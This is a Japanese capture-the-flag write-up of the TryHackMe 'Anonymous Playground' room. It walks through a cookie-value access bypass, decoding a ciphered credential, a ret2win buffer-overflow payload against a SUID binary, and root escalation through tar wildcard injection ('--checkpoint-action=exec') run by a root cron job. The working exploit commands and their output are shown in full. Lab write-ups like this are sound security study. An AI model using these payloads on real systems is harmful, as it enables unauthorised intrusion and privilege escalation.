# Anonymous Playground CTF

https://tryhackme.com/room/anonymousplayground

## Enumeration

```shell
TARGET=10.48.148.29
sudo bash -c "echo $TARGET   anonymous.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p22,80 $TARGET

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

SSH, HTTPのみ。

## HTTP

robots.txt

```txt
User-agent: *
Disallow: /zYdHuAKjP 
```

このURLにアクセスしたら、deniedと表示された。

```txt
You have not been granted access.
Access denied.
```

#### operative.php

```
themayor
spooky
darkstar
akaelite
ninja
w0rmer
nameless0ne
0day
szymex
ma1ware
paradox
bee
iamwill
jammy
magna
cryillic
skidy
naughty
thealchemist
itsundae
```

コメントアウトの中にPHP名が含まれていた。が、アクセスしたら404。

```html
<!-- <li class="nav-item">
    <a class="nav-link text-white" href="/upcoming.php">Upcoming Missings</a>
</li> -->
```

### /zYdHuAKjP

denied が返ったとき、access Cookieが設定されている。

```http
Set-Cookie: access=denied; expires=Thu, 12-Mar-2026 02:26:41 GMT; Max-Age=2592000; path=/
```

accepted に変更したが失敗。  
granted に変更したらバイパスできた。

```http
GET /zYdHuAKjP HTTP/1.1

Host: anonymous.thm
...
Cookie: access=granted
```

## 文字列

```txt
Access granted.
Well done getting this far. But can you go further?

hEzAdCfHzA::hEzAdCfHzA[REDACTED]
```

- コロンが1個なら認証情報のような形だが、2つある。
- 左側の文字列は、右側の文字列のPrefixになっている。
- 小文字と大文字が交互に出てくる。

2文字で1文字を表すと仮定し、hEzAdCfHzA　が前出の名前リストに出ていると仮定する。5文字かつ2文字目と5文字目が一致するのは `magna` のみ。

```
hE -> m
zA -> a
dC -> g
fH -> n
```

が成立する法則性があるか考えると、2文字目を1始まりのインデックスとみなすと、1文字目＋インデックスの値＝変換後の値が成立する。

```
hE -> h + index(E) -> h + 5 -> m
zA -> z + index(A) -> z + 1 -> a
dC -> d + index(C) -> d + 3 -> g
fH -> f + index(H) -> f + 8 -> n
```

認証情報になった。

```
magna::magna[REDACTED]
```

## 権限昇格１

hacktheworld に root のSUIDが付いている。

```sh
magna@ip-10-48-176-86:~$ ls -al
total 64
drwxr-xr-x 7 magna  magna  4096 Jul 10  2020 .
drwxr-xr-x 6 root   root   4096 Feb 10 04:34 ..
lrwxrwxrwx 1 root   root      9 Jul  4  2020 .bash_history -> /dev/null
-rw-r--r-- 1 magna  magna   220 Jul  4  2020 .bash_logout
-rw-r--r-- 1 magna  magna  3771 Jul  4  2020 .bashrc
drwx------ 2 magna  magna  4096 Jul  4  2020 .cache
drwxr-xr-x 3 magna  magna  4096 Jul  7  2020 .config
-r-------- 1 magna  magna    33 Jul  4  2020 flag.txt
drwx------ 3 magna  magna  4096 Jul  4  2020 .gnupg
-rwsr-xr-x 1 root   root   8528 Jul 10  2020 hacktheworld
drwxrwxr-x 3 magna  magna  4096 Jul  4  2020 .local
-rw-r--r-- 1 spooky spooky  324 Jul  6  2020 note_from_spooky.txt
-rw-r--r-- 1 magna  magna   807 Jul  4  2020 .profile
drwx------ 2 magna  magna  4096 Jul  4  2020 .ssh
-rw------- 1 magna  magna   817 Jul  7  2020 .viminfo
```

hacktheworld のこと？Pwn系かと思われる。

```sh
magna@ip-10-48-176-86:~$ cat ./note_from_spooky.txt 
Hey Magna,

Check out this binary I made!  I've been practicing my skills in C so that I can get better at Reverse
Engineering and Malware Development.  I think this is a really good start.  See if you can break it!

P.S. I've had the admins install radare2 and gdb so you can debug and reverse it right here!

Best,
Spooky
```

### hacktheworld

リバース。明らかに ret2win。

```c
undefined8 main(void)
{
  char local_48 [64];
  
  printf("Who do you want to hack? ");
  gets(local_48);
  return 0;
}

void call_bash(void)
{
  puts("\nWe are Anonymous.");
  sleep(1);
  puts("We are Legion.");
  sleep(1);
  puts("We do not forgive.");
  sleep(1);
  puts("We do not forget.");
  sleep(1);
  puts("[Message corrupted]...Well...done.");
  setuid(0x539);
  system("/bin/sh");
  return;
}
```

アドレス固定なので、call_bashのアドレス（0x00400655）を バッファ64+8 バイトの位置に書き込むだけで、uid=0x539（spooky）のシェルを取れるはず。

```sh
$ pwn checksec ./hacktheworld 
[*] '/home/kali/ctf/anonymous/hacktheworld'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

ただし、pwn がインストールされていないので radare2 を使わなければならない。

```sh
magna@ip-10-48-176-86:~$ r2 -d ./hacktheworld 
Process with PID 9455 started...
= attach 9455 9455
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
[0x7f7cd4a32100]> dc
Who do you want to hack? aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
child stopped with signal 11
[+] SIGNAL 11 errno=0 addr=0x00000000 code=128 ret=0
[0x0040070f]> dr
rax = 0x00000000
rbx = 0x00400710
rcx = 0x7f7cd4a1e980
rdx = 0x00000000
r8 = 0x7fff545bf060
r9 = 0x00000000
r10 = 0xfffffffffffff3b3
r11 = 0x00000246
r12 = 0x00400570
r13 = 0x7fff545bf190
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x36e996b1
rdi = 0x7f7cd4a207f0
rsp = 0x7fff545bf0a8
rbp = 0x6161617261616171
rip = 0x0040070f
rflags = 0x00010206
orax = 0xffffffffffffffff
```

オフセットは 68 + 8 バイトで正しいことを確認できた。

```sh
magna@ip-10-48-176-86:~$ python3 -c 'print("A"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00")' | ./hacktheworld 
Who do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
Segmentation fault (core dumped)
```

call_bash を呼び出すことは成功したが、セグメンテーション違反発生。

下記の構文にしても、何か入力した瞬間にエラー発生。

```sh
magna@ip-10-48-176-86:~$ ( python3 -c 'print("A"*72 + "\x57\x06\x40\x00\x00\x00\x00\x00")'; cat; ) | ./hacktheworld
Who do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
aaaaa
Segmentation fault (core dumped)
```

retアドレスのアラインメントが合っていない状態だったので、1バイトずらしたら成功した。

```sh
magna@ip-10-48-176-86:~$ ( python3 -c 'print("A"*72 + "\x58\x06\x40\x00\x00\x00\x00\x00")'; cat; ) | ./hacktheworldWho do you want to hack? 
We are Anonymous.
We are Legion.
We do not forgive.
We do not forget.
[Message corrupted]...Well...done.
id
uid=1337(spooky) gid=1001(magna) groups=1001(magna)
```

SSHキー取得。

```sh
cat .ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
[REDACTED]
-----END RSA PRIVATE KEY-----
```

しかし、パスワード要求されて接続できなかった。

```sh
$ ssh spooky@$TARGET -i ./id_rsa_spooky 
spooky@10.48.176.86's password:
```

鍵として認識されていない模様。

```sh
$ ssh -v spooky@$TARGET -i ./id_rsa_spooky 
OpenSSH_9.9p1 Debian-3, OpenSSL 3.5.4 30 Sep 2025
debug1: Reading configuration data /etc/ssh/ssh_config
debug1: Reading configuration data /etc/ssh/ssh_config.d/20-systemd-ssh-proxy.conf
debug1: /etc/ssh/ssh_config line 21: Applying options for *
debug1: Connecting to 10.48.176.86 [10.48.176.86] port 22.
debug1: Connection established.
debug1: identity file ./id_rsa_spooky type -1
debug1: identity file ./id_rsa_spooky-cert type -1
```

## 権限昇格２


/home/spookey 中のスクリプト。

```sh
-rw-rw-r-- 1 spooky magna   535 Jul 10  2020 .webscript

magna@ip-10-48-176-86:~$ cat ../spooky/.webscript 
#!/bin/sh

# get current user uid / gid
CURR_UID="$(id -u)"
CURR_GID="$(id -g)"

# save file
cat > .cachefile.c << EOF
#include <stdio.h>
int main()
{
setuid($CURR_UID);
setgid($CURR_GID);
execl("/bin/bash", "-bash", NULL);
return 0;
}
EOF

# make folder where the payload will be saved
mkdir .cache
chmod 755 .cache

# compile & give SUID
gcc -w .cachefile.c -o .cache/.cachefile
chmod 4755 .cache/.cachefile

# clean up
rm -rf ./'--checkpoint=1'
rm -rf ./'--checkpoint-action=exec=sh .webscript'
rm -rf .webscript
rm -rf .cachefile.c
```

`rm -rf ./'--checkpoint=1'` や `rm -rf ./'--checkpoint-action=exec=sh .webscript'` は、tarコマンド＋ワイルドカードで見られるエクスプロイト。

案の定、crontabでtarコマンドがスケジュールされている。

```sh
spooky@ip-10-48-176-86:/home/spooky$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/1 *   * * *   root    cd /home/spooky && tar -zcf /var/backups/spooky.tgz *
```

エクスプロイト

```sh
spooky@ip-10-48-176-86:/home/spooky$ touch "/home/spooky/--checkpoint=1"
spooky@ip-10-48-176-86:/home/spooky$ touch "/home/spooky/--checkpoint-action=exec=sh .webscript"
spooky@ip-10-48-176-86:/home/spooky$ ls -al
total 36
...
-rw-rw-r-- 1 spooky magna     0 Feb 10 08:16 '--checkpoint=1'
-rw-rw-r-- 1 spooky magna     0 Feb 10 08:16 '--checkpoint-action=exec=sh .webscript'
...
```

成功。

```sh
spooky@ip-10-48-176-86:/home/spooky$ ls -al ./.cache
total 28
drwxr-xr-x 2 root   root    4096 Feb 10 08:17 .
drwxr-xr-x 5 spooky spooky  4096 Feb 10 08:17 ..
-rwsr-xr-x 1 root   root   16792 Feb 10 08:17 .cachefile
```

```sh
spooky@ip-10-48-176-86:/home/spooky$ ./.cache/.cachefile
root@ip-10-48-176-86:/home/spooky# id
uid=0(root) gid=0(root) groups=0(root),1001(magna)
```

## 振り返り

- 暗号の部分は我ながらよく自力で解けたと思う。
- pwn は本当にすぐ忘れる。`(python cat) | ./bin` の構文と、retアドレスアラインメントを今度こそ記憶したい。
- Radare2 は良い勉強になった。ヘルプの使い方が斬新。
- tar コマンドのエクスプロイトは知っていたのですぐ気づけた。知っていることが最も大事。

## Tags

#tags:認証バイパス #tags:pwn #tags:Radare2
